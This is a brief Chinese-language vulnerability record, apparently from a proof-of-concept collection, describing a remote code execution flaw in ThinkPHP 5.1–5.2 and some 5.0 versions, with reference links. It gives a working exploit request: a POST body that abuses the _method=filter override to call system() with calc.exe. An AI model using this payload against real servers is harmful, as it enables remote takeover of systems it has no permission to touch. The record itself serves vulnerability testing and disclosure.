## 漏洞类型

- RCE

## 影响范围

Thinkphp5.1～5.2全版本，5.0.*部分版本中也适用。

## POC|EXP

```txt
(post)public/index.php

(data)c=system&f=calc.exe&_method=filter
```

## 参考链接


> https://xz.aliyun.com/t/3868
>
> https://www.secpulse.com/archives/95952.html